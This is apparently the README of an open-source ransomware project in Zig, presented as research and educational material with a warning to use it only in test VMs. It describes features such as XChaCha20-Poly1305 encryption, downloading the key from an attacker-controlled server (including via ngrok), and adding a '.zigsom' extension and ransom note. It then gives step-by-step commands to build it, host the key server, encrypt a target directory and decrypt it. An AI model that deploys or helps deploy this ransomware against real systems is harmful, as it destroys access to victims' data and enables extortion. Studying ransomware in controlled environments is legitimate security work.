# :t-rex: Zigsomware :t-rex:

Zigsomware is a ransomware example written in Zig. This is not practical and is only for research purposes of Zig implementation.

<br />

## Features

- Encrypts files with XChaCha20-Poly1305.
- Downloads a encryption key from a specified server.
- Decrypts the encrypted files.

<br />

## Requirements

- Linux
- Zig version 0.14.0

<br />

> ## ATTENTION

> - The project aims to help security research and educational purposes. Do not use it on any systems not under your control.
> - Don't use it on your personal machine. Instead, use it on your test environment such as VM.
> - Anyway, use it at your own risk.

<br />

# Tutorial

## 1. Install

First clone the repository:

```sh
git clone https://github.com/hideckies/zigsomware.git
cd zigsomware
```

And build the project with specified options:

```sh
# -DSERVER_HOST: Server address
# -DSERVER_PORT: Server port
# -DSERVER_PATH: the url path of the server to download a encryption key.
zig build -DSERVER_HOST=127.0.0.1 -DSERVER_PORT=4444 -DSERVER_PATH=/
```

As above, we need to specify your server host/port/path for allowing the Zigsomware to download a encryption key. We can also set other servers such as `ngrok`.  
After that, the executables are generated under `zig-out` directory:

```sh
file ./zig-out/x86_64-linux/zigsomware
file ./zig-out/x86_64-windows/zigsomware.exe
```

## 2. Generate Encryption Key & Host It

Next, generate an encryption key to be used for encryption/decryption.  
To generate it, run the following command:

```sh
./zig-out/x86_64-linux/zigsomware --genkey
# output example: cncV+3zy9LUXPssav7SvivRAO1kPopVXRGtk+/eW/nY=
```

We need to host this key in the server that you have specified when building: `https://<SERVER_HOST>:<SERVER_PORT>/<SERVER_PATH>`.  
For testing purposes, I created a simple API server (`server/server.py`) so use it this time:

```sh
cd server
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
python3 server.py --port 4444 --key cncV+3zy9LUXPssav7SvivRAO1kPopVXRGtk+/eW/nY=
```

As above, we need to set the `--port` and the `--key`.  
Then this server hosts the encryption key at the root path (`/`). Our `Zigsomware` will donwload the encryption key from the server.  

## 3. Run Zigsomware (Encryption)

On the target machine, execute the `zigsomware` with the specified target directory to encrypt:

```sh
# -e: Encryption
./zigsomware -e ./test_dir/
```

When executed, the `zigsomware` downloads the encryption key from the server that you have specified, then encrypts files udner `./test_dir/` directory and appends ransom extensions (`.zigsom`) to each file.
A ransom note (`README.txt`) has also been created in the directory.

## 4. Decryption

To decrypt the files, run `zigsomware` with `-d` flag and set a **Base64-encoded encryption key** that was sent to our server during encryption:

```sh
# -d: Decrypt
# -k: Base64-encoded encryption key
./zigsomware -d -k cncV+3zy9LUXPssav7SvivRAO1kPopVXRGtk+/eW/nY= ./test_dir/
```
